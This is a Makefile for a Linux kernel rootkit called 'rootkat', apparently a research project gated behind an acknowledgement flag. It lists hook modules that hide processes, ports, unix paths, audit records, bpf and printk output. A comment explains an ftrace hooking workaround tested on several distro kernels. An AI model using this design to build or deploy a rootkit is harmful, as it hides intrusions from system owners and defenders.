# Refuse to build without explicit acknowledgement.
ifndef ROOTKAT_I_UNDERSTAND
$(error Set ROOTKAT_I_UNDERSTAND=1 to build. See README.md)
endif

# Disable sibling-call (tail-call) optimization for every object in
# this module. ftrace IPMODIFY hooks with our recursion guard
# (within_module(parent_ip, THIS_MODULE) → skip) rely on the call to
# `orig(...)` showing up as a real CALL instruction so the return
# address sits on the stack inside our module. With sibling-call opt,
# `return orig(...)` becomes a JMP — return address stays as the
# kernel-side caller, parent_ip doesn't land in THIS_MODULE on
# re-entry, recursion guard fails, infinite loop. Hit on Debian
# 6.12.85 / Fedora 6.14.0 (cross-distro survey 2026-05-08); Ubuntu
# 6.8 / 7.0 happen to dodge the optimization. Compiler-enforced
# defense beats relying on every hook author remembering to insert
# a barrier after orig.
ccflags-y += -fno-optimize-sibling-calls

obj-m += rootkat.o
rootkat-y := main.o kallsyms.o resolver.o ftrace_hook.o \
             hidden_pids.o hidden_ports.o hidden_unix_paths.o \
             magic_actions.o \
             hook_m_show.o hook_sys_kill.o hook_filldir64.o \
             hook_tcp4_seq_show.o hook_tcp6_seq_show.o \
             hook_udp_seq_show.o \
             hook_inet_sk_diag_fill.o hook_sys_bpf.o \
             hook_audit.o hook_unix_seq_show.o hook_unix_diag.o \
             hook_io_issue_sqe.o hook_netfilter.o hook_printk.o

# Inside the build container, $(uname -r) returns the host kernel which has
# no headers tree. Resolve KDIR from the headers package layout instead.
KDIR ?= /lib/modules/$(shell ls /lib/modules | head -n1)/build
PWD  := $(shell pwd)

all:
	$(MAKE) -C $(KDIR) M=$(PWD) modules

clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean
